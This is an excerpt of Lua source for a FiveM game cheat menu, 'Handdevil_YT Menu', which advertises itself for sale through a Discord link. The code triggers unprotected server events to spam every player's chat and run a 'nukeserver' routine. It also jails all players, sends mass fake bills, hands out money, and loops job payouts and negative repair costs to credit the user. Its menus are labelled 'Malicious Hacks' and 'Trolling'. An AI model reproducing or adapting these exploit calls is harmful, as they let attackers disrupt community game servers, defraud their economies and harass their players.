                ...
                Citizen.CreateThread(
                    function()
                        ...
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                'Eliot Nium#9070 BUY EXECUTOR MENU <',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. 'https://discord.gg/F4KBEMp'
                            )
                        end
                        for i = 0, 256 do
                            TriggerServerEvent(
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Eliot Nium#9070 BUY EXECUTOR MENU < https://discord.gg/F4KBEMp',
                                43161337
                            )
...
function teleportToNearestVehicle()
    ...
    Citizen.CreateThread(function()
        while discordPresence do
            ...
            SetDiscordAppId(619940387510943784)

            --Here you will have to put the image name for the "large" icon.
            SetDiscordRichPresenceAsset("Handdevil_YT")

            --(11-11-2018) New Natives:

            --Here you can add hover text for the "large" icon.
            SetDiscordRichPresenceAssetText("Handdevil_YT Menu | Eliot Nium#9070")

            --Here you will have to put the image name for the "small" icon.
            SetDiscordRichPresenceAssetSmall("Handdevil_YT")

            --Here you can add hover text for the "small" icon.
            SetDiscordRichPresenceAssetSmallText("Contact Eliot Nium#9070 to buy!")
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Handdevil_YT; Eliot Nium#9070")
        end
        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'Eliot Nium#9070',
                    {0, 0x99, 255},
                    '/ooc Handdevil_YT Menu! Buy at https://discord.gg/F4KBEMp'
                )
                TriggerServerEvent('_chat:messageEntered', 'Eliot Nium#9070', {0, 0x99, 255}, 'Handdevil_YT Menu <3 https://discord.gg/F4KBEMp')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Handdevil_YT Babe <3 Eliot Nium#9070 https://discord.gg/F4KBEMp")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Handdevil_YT Babe <3 Eliot Nium#9070 https://discord.gg/F4KBEMp")
				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."Eliot Nium#9070 discord")
					end
				end
				...
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "The best menu in fivem!?,https://discord.gg/F4KBEMp Eliot Nium#9070 ", 10000000)
						TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."Eliot Nium#9070 discord")
				end
			end
...
Citizen.CreateThread(
    function()
        ...
        Plane.CreateMenu("MainMenu", "~r~Handdevil_YT")
		Plane.SetSubTitle("MainMenu", "BETA")
        ...
        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                drawNotification("~b~https://discord.gg/F4KBEMp")
                if Plane.MenuButton    ("~r~→ Self ~s~Menu", "SelfMenu") then
                elseif Plane.MenuButton("~b~→ Teleport ~s~Menu", "TeleportMenu") then
				--elseif Plane.MenuButton("~r~→ Al ~s~Menu", "AI") then--
                elseif Plane.MenuButton("~g~→ Online ~s~Players", "OnlinePlayersMenu") then
                elseif Plane.MenuButton("~y~→ Weapon ~s~Menu", "WeaponMenu") then
                elseif Plane.MenuButton("~p~→ Vehicle ~s~Menu", "VehMenu") then
                elseif Plane.MenuButton("~o~→ Malicious ~s~Hacks", "MaliciousMenu") then
                elseif Plane.MenuButton("~c~→ Trolling ~s~Options", "TrollMenu") then
                elseif Plane.MenuButton("~m~→ ESX ~s~Options", "ESXMenu") then
                elseif Plane.MenuButton("~u~→ VRP ~s~Options", "VRPMenu") then
				elseif Plane.MenuButton("~w~→ Models ~s~Menu", "Models") then
				elseif Plane.MenuButton("~r~→ Credits ~s~Menu", "Credits") then
                elseif Plane.Button("~s~→ Close menu") then
                    Enabled = false
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("VRPMenu") then
                if Plane.Button("~p~∑ ~y~VRP ~s~PayGarage 100$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100})
                elseif Plane.Button("~p~∑ ~y~VRP ~s~PayGarage 1000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
                elseif Plane.Button("~p~∑ ~y~VRP ~s~PayGarage 10 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
                elseif Plane.Button("~p~∑ ~y~VRP ~s~PayGarage 100 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
                elseif Plane.Button("~p~∑ ~y~VRP ~s~Get Driver Licence") then
                    TriggerServerEvent("dmv:success")
                elseif Plane.Button("~p~∑ ~y~VRP ~s~Bank Deposit") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:deposit", amount)
                elseif Plane.Button("~p~∑ ~y~VRP ~s~Bank Withdraw") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:withdraw", amount)
                elseif Plane.Button("~p~∑ ~y~VRP ~s~Slot Machine") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Handdevil_YT Menu https://discord.gg/F4KBEMp", "6536955669")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Handdevil_YT Menu https://discord.gg/F4KBEMp", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Handdevil_YT Menu https://discord.gg/F4KBEMp", "696G623691")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Handdevil_YT Menu https://discord.gg/F4KBEMp", "69693553S9")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Handdevil_YT Menu https://discord.gg/F4KBEMp", "6969696969")
                end
    ...
    if not DoesEntityExist(veh) then
        drawNotification(
            "You are not sitting in a vehicle mate"
                ...
                elseif Plane.Button("Spawn a vehicle") then
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "Handdevil_YT")
                    else
            ...
            elseif Plane.IsMenuOpened("ESXMenu") then
                if Plane.MenuButton("~p~∑ ~g~ESX ~s~Money Options", "ESXMoneyMenu") then
                elseif Plane.MenuButton("~p~∑ ~g~ESX ~s~Job Menu", "ESXJobMenu") then
                elseif Plane.MenuButton("~p~∑ ~g~ESX ~s~Boss", "ESXBossMenu") then
                elseif Plane.MenuButton("~p~∑ ~g~ESX ~s~Drugs", "ESXDrugMenu") then
                elseif Plane.MenuButton("~p~∑ ~g~ESX ~s~Misc", "ESXMiscMenu") then
                end
            ...
            elseif Plane.IsMenuOpened("SelfMenu") then
                if Plane.Button("~g~Heal") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif Plane.Button("~b~Give Armor") then
				...
				elseif Plane.Button("~g~(ESX) ~s~Give yourself money ") then
				...
				elseif Plane.Button("~g~ESX ~s~Taxijob  10.000x") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
				elseif Plane.Button("~y~(VRP) ~s~Give yourself money ") then
				TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				drawNotification("Money deposited succesfully")
				elseif Plane.Button("~y~(VRP) ~s~Give yourself 10x salary ") then
                ...
                elseif Plane.Button("~g~Revive") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif Plane.Button("~g~ESX ~h~~b~Open Jail Menu ") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif Plane.Button("~g~ESX Get Out Of Jail") then
                ...
                elseif Plane.Button("~r~Suicide") then
            ...
            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
				...
				elseif Plane.IsMenuOpened("Credits") then
                    if Plane.Button("~r~~h~Handdevil_YT👺🤯#9070 ") then
                   drawNotification("~h~<FONT COLOR='#ff0000'>Ajoute Moi!~s~")
                   drawNotification("~h~<FONT COLOR='#ff00ec'>Pour Acheter <3 ~s~")
                   drawNotification("~h~<FONT COLOR='#9b00ff'>https://discord.gg/F4KBEMp~s~")
				--elseif Plane.Button("~g~~h~Not Soviet Bear#6205 - Helping tons") then--
                elseif Plane.Button("~p~~h~zepek✔#1402- Helping With Coding") then
                elseif Plane.Button("~b~~h~Saykaa - Testing Tons") then
